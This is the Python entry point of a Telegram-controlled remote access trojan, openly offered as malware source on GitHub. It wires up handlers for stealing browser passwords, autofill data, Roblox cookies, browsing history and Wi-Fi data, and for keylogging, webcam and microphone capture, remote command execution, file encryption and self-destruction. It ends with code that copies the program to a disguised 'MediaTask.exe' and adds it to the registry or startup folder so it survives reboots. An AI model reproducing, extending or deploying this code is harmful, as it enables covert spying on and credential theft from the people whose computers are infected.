##  _________________________________________
##   |_______  authors: Eks1azy  _______| 
##    \_\_\_|______  Oqwe4O  _______|\_\_\_\
##           \_\_\_\_\_\_\_\_\_\_\_\                    
##  ___________________________________________
##  |                                          /\
##  |  github:https://github.com/Eks1azy   / /
##  |                                        / / 
##  |    if you will find some bugs or      / /
##  |                                      / /
##  |    have ideas for improvements,     / /
##  |                                    / /
##  |       please send it to me        / /
##  |__________________________________/ /
##  \_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_/



from config import API_TOKEN, ALLOWED_USER_ID, MAX_ATTEMPTS, MAX_MESSAGE_LENGTH, destination_folder, directory, file_ids
import os
import asyncio
from config import bot, dp


########### COMMIT WHEN YOU WILL BUILD EXE ###########

# ## Отключение вывода на экран
# sys.stdout = open(os.devnull, 'w')  
# sys.stderr = open(os.devnull, 'w')  
# logging.basicConfig(level=logging.CRITICAL + 1)
# logging.getLogger('aiogram').disabled = True

# ## Включаем логирование, чтобы не пропустить важные сообщения
# logging.basicConfig(level=logging.INFO)

############################ START MENU COMMANDS ###########################

from lib.start_menu import register_start_menu_handler

register_start_menu_handler(dp)

#user_directories = {}

#############################  CMD COMMAND  ##############################

from lib.System.PC.cmd import register_cmd_comand

register_cmd_comand(dp)

###########################  ROBLOX COOKIE  ###############################

from lib.Credintial.roblosecurity import register_roblosecurity_handler

register_roblosecurity_handler(dp)

#########################  BROWSER PASSWORDS  #############################

from lib.Credintial.password import register_password_handler

register_password_handler(dp)

############################  BROWSER AUTOFILL  ###########################

from lib.Credintial.autofill import register_autofill_handler

register_autofill_handler(dp)

##############################  PLAY SOUND  ###############################

from lib.Access.Audio.play_sound import register_play_sound_handlers

register_play_sound_handlers(dp)

#############################  KEY LOGGER  ################################

from lib.System.Key_logger.key_logger_handlers import key_logger_handlers

key_logger_handlers(dp)

############################  KEY LOGS  ###################################

from lib.System.Key_logger.key_logs_handlers import key_logs_handlers

key_logs_handlers(dp)

################################  ANTIVIRUS  ##############################

from lib.System.Antivirus.antivirus_handlers import register_antivirus_handlers

register_antivirus_handlers(dp)

##############################  SCREENSHOT  ###############################

from lib.Access.Screenshot.screenshot_handlers import register_screenshot_handlers

register_screenshot_handlers(dp)

##############################  SNAPSHOT  #################################

from lib.Access.Webcam.Snapshot import register_snapshot_handlers

register_snapshot_handlers(dp)

###############################  PROCCESES ################################

from lib.System.Procceses.process import register_processes_handlers

register_processes_handlers(dp)

#############################  FULL PROCCESSES  ###########################

from lib.System.Procceses.fullprocesses import register_full_processes_handlers

register_full_processes_handlers(dp)

###########################  TERMINATE PROCCES ############################

from lib.System.Procceses.terminate_process import register_terminate_process_handlers

register_terminate_process_handlers(dp)

############################  CREATE FOLDER  ##############################

from lib.System.Folders.create_folder import register_create_folder

register_create_folder(dp)

############################  DELETE FOLDER  ##############################

from lib.System.Folders.delete_fodlder import register_folder_delete

register_folder_delete(dp)

###########################  DOWNLOAD FILE  ###############################

from lib.System.File.download_file import register_download_file

register_download_file(dp)

#############################  DELETE FILE  ###############################

from lib.System.File.delete_file import register_delete_file

register_delete_file(dp)

##########################  DIRECTORY VALUE  ##############################

from lib.System.More.directory_value import register_directory_value

register_directory_value(dp)

##############################  CHANGE CD  ################################

from lib.System.More.move_to_directory import register_cd

register_cd(dp)

##########################  CHROME HISTORY  ###############################

from lib.Credintial.Chrome_history import register_chrome_history_handlers

register_chrome_history_handlers(dp)

############################  RECORD WEBCAM  ##############################

from lib.Access.Webcam.Web_record import register_webcam_record_handlers

register_webcam_record_handlers(dp)

###############################  Alt F4  ##################################

from lib.System.Folders.altf4 import register_alt_f4_handlers

register_alt_f4_handlers(dp)

#############################  CLOSE ALL WINDOW  ##########################

from lib.System.Folders.closefolders import register_minimize_all_windows_handlers

register_minimize_all_windows_handlers(dp)


############################ OPEN FOLDERS #################################

from lib.System.Folders.open_folders import register_open_file_handlers

register_open_file_handlers(dp)


###############################  LOAD FILE  ###############################

from lib.System.File.load_file import register_load_file

register_load_file(dp)

#################################  AUDIO  #################################

from  lib.Access.Audio.recordmic_handlers import register_audio_handlers

register_audio_handlers(dp)

#############################  CHECK COPIED  ##############################

from lib.System.More.check_copied import register_check_copied

register_check_copied(dp)

###############################  OPEN URL  ################################

from lib.System.More.open_url import register_open_url

register_open_url(dp)

##########################  СLOSE DISPETCHER  #############################

from lib.System.More.close_dp import register_close_dp

register_close_dp(dp)

###########################  OPERA HISTORY  ###############################

from lib.Credintial.Opera_history import register_opera_history_handlers

register_opera_history_handlers(dp)

##############################  SOUND OFF  ################################

from lib.System.Sound.Sound_off import register_mute_handlers

register_mute_handlers(dp)

###############################  SOUND ON  ################################

from lib.System.Sound.Sound_on import register_sound_handlers

register_sound_handlers(dp)

###########################  SOUND ONN 100%  ##############################

from lib.System.Sound.volume_100 import register_volume_100

register_volume_100(dp)

#############################  ENSRYPT FILE  ##############################

from lib.System.Crypt.Encrypt import register_encrypt_handlers

register_encrypt_handlers(dp)

############################  DISCRYPT FILE  ##############################

from lib.System.Crypt.discrypt import register_discrypt

register_discrypt(dp)

###############################  CMD BOMB  ################################

from lib.System.PC.cmd_bomb import register_cmd_bomb

register_cmd_bomb(dp)

################################  PC DATA  ################################

from lib.System.PC.pc_data import register_pc_data

register_pc_data(dp)

################################  WIFI DATA  ##############################

from lib.System.PC.wifi_data import register_wifi_data

register_wifi_data(dp)

#############################  PC SHUTDOWN  ###############################

from lib.System.PC.pc_off import register_shutdown_handlers

register_shutdown_handlers(dp)

##############################  REBOOT PC  ################################

from lib.System.PC.pc_reboot import register_reboot_handlers

register_reboot_handlers(dp)

##########################  WALLPAPER CHANGE  #############################

from lib.System.PC.change_wallpaper import register_wallpaper_handlers

register_wallpaper_handlers(dp)

###############################  MOVE FILE  ###############################

from lib.System.Folders.move_file import register_move_file

register_move_file(dp)

#############################  SELF DESTRICTION  ##########################

from lib.System.PC.self_destruction import register_self_destruction

register_self_destruction(dp)

###########################################################################

from lib.func import *

async def main():
    destination_folder = r'C:\ProgramData\MediaTask'
    new_name = 'MediaTask.exe'
    icon_path = None  

    if not os.path.exists(destination_folder):
        os.makedirs(destination_folder)

    result = copy_and_rename(destination_folder, new_name, icon_path)
  
    await dp.start_polling(bot)


if __name__ == "__main__":

    ########### UNCOMMIT WHEN YOU WILL BUILD EXE ###########

    copy_and_run()

    script_path = 'C:\\ProgramData\\MediaTask\\MediaTask.exe'

    if not add_to_registry(script_path):
        add_to_startup_folder(script_path)

    asyncio.run(main())